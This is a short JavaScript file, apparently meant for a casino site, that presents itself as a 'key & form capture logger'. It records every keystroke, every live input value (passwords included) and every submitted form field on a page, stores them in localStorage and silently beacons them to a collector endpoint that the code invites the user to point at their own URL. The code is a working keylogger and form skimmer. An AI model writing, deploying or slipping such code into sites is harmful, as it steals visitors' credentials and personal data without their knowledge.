/**
 * Key & form capture logger
 * Logs keystrokes and form submissions to console + localStorage + optional beacon endpoint
 */
(function () {
  const LOG_KEY = 'casino_capture_log';
  const ENDPOINT = '/api/log'; // change to your collector URL if needed

  function getLog() {
    try {
      return JSON.parse(localStorage.getItem(LOG_KEY) || '[]');
    } catch {
      return [];
    }
  }

  function saveLog(entry) {
    const log = getLog();
    log.push({
      ts: new Date().toISOString(),
      ...entry
    });
    // keep last 500 entries
    if (log.length > 500) log.splice(0, log.length - 500);
    localStorage.setItem(LOG_KEY, JSON.stringify(log));
    console.log('[capture]', entry);

    // optional silent beacon (fails silently if no server)
    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(ENDPOINT, JSON.stringify(entry));
      } else {
        fetch(ENDPOINT, {
          method: 'POST',
          body: JSON.stringify(entry),
          headers: { 'Content-Type': 'application/json' },
          keepalive: true
        }).catch(() => {});
      }
    } catch (_) {}
  }

  // keystroke capture on document
  document.addEventListener('keydown', function (e) {
    // ignore pure modifiers
    if (['Shift', 'Control', 'Alt', 'Meta'].includes(e.key)) return;
    saveLog({
      type: 'key',
      key: e.key,
      code: e.code,
      target: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.name ? '[name=' + e.target.name + ']' : '')
    });
  }, true);

  // form submit capture
  document.addEventListener('submit', function (e) {
    const form = e.target;
    const data = {};
    const inputs = form.querySelectorAll('input, textarea, select');
    inputs.forEach(inp => {
      if (inp.name || inp.id) {
        data[inp.name || inp.id] = inp.value;
      }
    });
    saveLog({
      type: 'form_submit',
      formId: form.id || null,
      data
    });
  }, true);

  // input change capture (for live values)
  document.addEventListener('input', function (e) {
    const t = e.target;
    if (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA') {
      saveLog({
        type: 'input',
        name: t.name || t.id || '',
        value: t.value,
        inputType: t.type
      });
    }
  }, true);

  // expose for debugging
  window.__casinoLog = {
    get: getLog,
    clear: () => localStorage.removeItem(LOG_KEY)
  };
})();